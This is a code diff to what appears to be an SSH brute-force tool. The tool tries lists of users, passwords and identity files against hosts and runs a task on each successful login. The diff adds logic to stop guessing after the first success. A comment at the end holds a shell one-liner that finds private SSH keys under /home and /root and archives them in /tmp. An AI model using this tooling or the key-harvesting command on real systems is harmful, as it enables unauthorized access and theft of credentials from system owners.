@@ -148,6 +148,7 @@ if not len(passwords) and not len(identities):
         "One of --password, --identity, --password-list, or --identity-list are required")
 
 # enumerate users
+success = False
 for user in users:
     # enumerate passwords
     for password in passwords:
@@ -167,6 +168,7 @@ for user in users:
                     password=password,
                 )
                 execute(session, args.task)
+                success = True
         except ChannelError as e:
             if e.args[0] in [
                 'ssh authentication failed: Authentication failed.',
@@ -201,6 +203,7 @@ for user in users:
                                 password=password,
                             )
                             execute(session, args.task)
+                            success = True
                             reconnect = False
                     except ChannelError as e:
                         if e.args[0] in [
@@ -216,6 +219,10 @@ for user in users:
 
             else:
                 raise e
+
+        # stop password enumeration
+        if success:
+            break
 
     # enumerate identities
     for identity in identities:
@@ -235,6 +242,7 @@ for user in users:
                     identity=identity,
                 )
                 execute(session, args.task)
+                success = True
         except ChannelError as e:
             if e.args[0] in [
                 'ssh authentication failed: Authentication failed.',
@@ -269,6 +277,7 @@ for user in users:
                                 password=password,
                             )
                             execute(session, args.task)
+                            success = True
                             reconnect = False
                     except ChannelError as e:
                         if e.args[0] in [
@@ -284,6 +293,13 @@ for user in users:
             else:
                 raise e
 
+        # stop identity enumeration
+        if success:
+            break
+
+    # stop user enumeration
+    if success:
+        break
 
 # archive all private keys
 # rm /tmp/ssh_keys.tar /tmp/ssh_keys.tgz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do; if grep "PRIVATE" $f>/dev/null; then tar -rvf /tmp/ssh_keys.tar $f; fi done && gzip /tmp/ssh_keys.tar > /tmp/ssh_keys.tgz
